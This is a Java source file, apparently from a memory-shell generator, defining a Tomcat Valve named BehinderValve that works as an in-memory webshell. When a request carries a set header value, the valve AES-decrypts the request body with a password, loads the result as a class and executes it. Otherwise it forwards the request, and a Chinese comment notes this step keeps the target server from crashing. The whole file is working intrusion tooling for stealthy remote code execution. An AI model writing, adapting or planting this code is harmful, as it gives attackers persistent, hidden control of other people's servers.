package jmg.behinder.memshell;

import org.apache.catalina.Valve;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletException;
import javax.servlet.http.HttpSession;
import java.io.IOException;
import java.util.HashMap;
import java.util.Map;


public class BehinderValve extends ClassLoader implements Valve {
    protected Valve next;
    protected boolean asyncSupported;

    public String pass;

    public String headerName;

    public String headerValue;

    public BehinderValve() {
    }

    public BehinderValve(ClassLoader c) {
        super(c);
    }

    public Class g(byte[] b) {
        return super.defineClass(b, 0, b.length);
    }

    @Override
    public Valve getNext() {
        return this.next;
    }

    @Override
    public void setNext(Valve valve) {
        this.next = valve;
    }

    @Override
    public boolean isAsyncSupported() {
        return this.asyncSupported;
    }

    @Override
    public void backgroundProcess() {
    }

    @Override
    public void invoke(Request request, Response response) throws IOException, ServletException {
        try {
            if (request.getHeader(headerName).contains(headerValue)) {
                HttpSession session = (request.getSession());
                Map obj = new HashMap();
                obj.put("request", request);
                obj.put("response", response);
                obj.put("session", session);
                session.putValue("u", pass);
                Cipher c = Cipher.getInstance("AES");
                c.init(2, new SecretKeySpec(pass.getBytes(), "AES"));
                (new BehinderValve(this.getClass().getClassLoader())).g(c.doFinal(this.base64Decode(request.getReader().readLine()))).newInstance().equals(obj);
            } else {
                // 重要: 没有这一步会将目标服务器打挂
                this.getNext().invoke(request, response);
            }
        } catch (Exception e) {
            this.getNext().invoke(request, response);
        }

    }

    public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) ((byte[]) ((byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str)));
        } catch (Exception var5) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke((Object) null);
            return (byte[]) ((byte[]) ((byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str)));
        }
    }
}